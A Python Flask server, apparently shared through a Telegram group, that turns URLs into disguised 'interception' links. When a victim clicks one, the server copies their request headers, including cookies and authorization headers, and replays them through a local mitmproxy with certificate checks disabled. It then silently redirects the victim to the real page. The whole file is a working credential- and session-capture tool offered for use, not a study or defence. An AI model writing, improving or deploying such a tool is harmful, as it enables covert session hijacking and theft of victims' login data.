#!/usr/bin/env python3
"""
Servidor de Interceptação - MITMProxy Telegram Notifier
Criado por: @vgsswon
Grupo: https://t.me/+RriqgodAtpY4NTgx
"""
from flask import Flask, redirect, abort, request
import requests
from shared_storage import storage

app = Flask(__name__)

PROXY_URL = "http://127.0.0.1:8080"

@app.route('/')
def index():
    return """
    <h1>MITMProxy Interceptor</h1>
    <p>Envie uma URL para o bot do Telegram para gerar um link de interceptação.</p>
    <p>Criado por: @vgsswon</p>
    <p>Grupo: <a href="https://t.me/+RriqgodAtpY4NTgx">https://t.me/+RriqgodAtpY4NTgx</a></p>
    """

@app.route('/i/<url_id>')
def intercept(url_id):
    original_url = storage.get(url_id)
    
    if not original_url:
        abort(404, description="Link expirado ou inválido")
    
    try:
        proxies = {
            'http': PROXY_URL,
            'https': PROXY_URL,
        }
        
        skip_headers = {
            'host', 'connection', 'content-length', 'content-encoding',
            'transfer-encoding', 'upgrade', 'proxy-connection',
            'keep-alive', 'te', 'trailer', 'upgrade-insecure-requests'
        }
        
        headers = {}
        for header_name, header_value in request.headers:
            if header_name.lower() not in skip_headers:
                headers[header_name] = header_value
        
        headers['X-Intercept-Capture'] = 'true'
        
        session = requests.Session()
        response = session.get(
            original_url,
            proxies=proxies,
            headers=headers,
            allow_redirects=False,
            verify=False,
            timeout=10
        )
        
        print(f"[Interceptor] URL interceptada: {original_url}")
        print(f"[Interceptor] Status: {response.status_code}")
        print(f"[Interceptor] Headers capturados: {len(headers)} headers")
        
    except Exception as e:
        print(f"[Interceptor] Erro ao fazer requisição via proxy: {e}")
    
    return redirect(original_url, code=302)

@app.route('/health')
def health():
    return {'status': 'ok', 'service': 'intercept-server'}

def cleanup_task():
    import threading
    import time
    def worker():
        while True:
            time.sleep(600)
            try:
                storage.cleanup_expired()
            except Exception as e:
                print(f"[Interceptor] Erro na limpeza: {e}")
    thread = threading.Thread(target=worker, daemon=True)
    thread.start()

if __name__ == '__main__':
    import os
    cleanup_task()
    port = int(os.environ.get('PORT', 5000))
    print(f"[Interceptor] Servidor rodando na porta {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
